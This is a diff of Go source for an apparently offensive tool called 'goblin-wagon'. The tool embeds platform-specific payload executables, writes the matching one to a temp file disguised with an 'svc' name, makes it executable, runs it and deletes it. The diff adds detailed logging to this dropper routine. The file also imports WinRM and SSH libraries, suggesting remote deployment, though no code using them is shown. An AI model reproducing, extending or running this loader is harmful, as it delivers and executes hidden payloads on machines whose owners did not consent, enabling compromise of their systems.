@@ -11,7 +11,7 @@ import (
 	"runtime"
 	"sync"
 	"unicode"
-
+	"log"
 	"github.com/masterzen/winrm"
 	"golang.org/x/crypto/ssh"
 )
@@ -201,16 +201,20 @@ var payload_windows_386 []byte
 //go:embed binaries/payload_windows_arm64.exe
 var payload_windows_arm64 []byte
 
-func main(){
-	
-	host_os := runtime.GOOS
-	arch := runtime.GOARCH
-	
-	// used to format to get only the number in 'intelXX' or 'amdXX'
-	if !is_only_letters(arch){
-		arch = arch[len(arch)-2:]
-	} 
+func main() {
+    log.SetFlags(log.Ltime | log.Lshortfile)
+    log.Println("[*] goblin-wagon starting")
 
+    host_os := runtime.GOOS
+    arch    := runtime.GOARCH
+
+    log.Printf("[*] detected OS: %s | Arch: %s", host_os, arch)
+
+    // used to format to get only the number in 'intelXX' or 'amdXX'
+    if !is_only_letters(arch) {
+        arch = arch[len(arch)-2:]
+        log.Printf("[*] arch trimmed to: %s", arch)
+    }
 
     payloads := map[Platform][]byte{
         {OS: "linux",   Arch: "amd64"}: payload_linux_amd64,
@@ -219,34 +223,61 @@ func main(){
         {OS: "windows", Arch: "amd64"}: payload_windows_amd64,
         {OS: "windows", Arch: "386"}:   payload_windows_386,
         {OS: "windows", Arch: "arm64"}: payload_windows_arm64,
-
     }
 
+    key := Platform{OS: host_os, Arch: arch}
+    log.Printf("[*] looking up platform key: %+v", key)
 
-	fmt.Println(payloads[Platform{OS: host_os, Arch: arch}])
-	
-	 data, ok := payloads[Platform{OS: runtime.GOOS, Arch: runtime.GOARCH}]
+    data, ok := payloads[key]
     if !ok {
+        log.Printf("[-] no payload matched for OS=%s Arch=%s -- bailing", host_os, arch)
         return
     }
+    log.Printf("[+] payload found, size: %d bytes", len(data))
 
-    // temp file ext for windows
     ext := ""
-    if runtime.GOOS == "windows" {
+    if host_os == "windows" {
         ext = ".exe"
     }
 
     tmp, err := os.CreateTemp("", "svc*"+ext)
     if err != nil {
+        log.Printf("[-] failed to create temp file: %v", err)
         return
     }
-    tmp.Write(data)
+    log.Printf("[*] temp file created: %s", tmp.Name())
+
+    n, err := tmp.Write(data)
+    if err != nil {
+        log.Printf("[-] failed to write payload to temp file: %v", err)
+        return
+    }
+    log.Printf("[+] wrote %d bytes to temp file", n)
     tmp.Close()
-    os.Chmod(tmp.Name(), 0700)
+
+    if err := os.Chmod(tmp.Name(), 0700); err != nil {
+        log.Printf("[-] chmod failed: %v", err)
+        return
+    }
+    log.Printf("[*] chmod 0700 applied")
 
     cmd := exec.Command(tmp.Name())
-    cmd.Run()
+    cmd.Stdout = os.Stdout  // pipe output so you can see what wagon.go is doing
+    cmd.Stderr = os.Stderr
+    log.Printf("[*] executing payload: %s", tmp.Name())
 
-    os.Remove(tmp.Name())
+    if err := cmd.Run(); err != nil {
+        log.Printf("[-] payload execution failed: %v", err)
+    } else {
+        log.Printf("[+] payload exited cleanly")
+    }
 
+    if err := os.Remove(tmp.Name()); err != nil {
+        log.Printf("[-] failed to remove temp file: %v", err)
+    } else {
+        log.Printf("[*] temp file cleaned up")
+    }
+
+    log.Println("[*] goblin-wagon done")
 }
+	
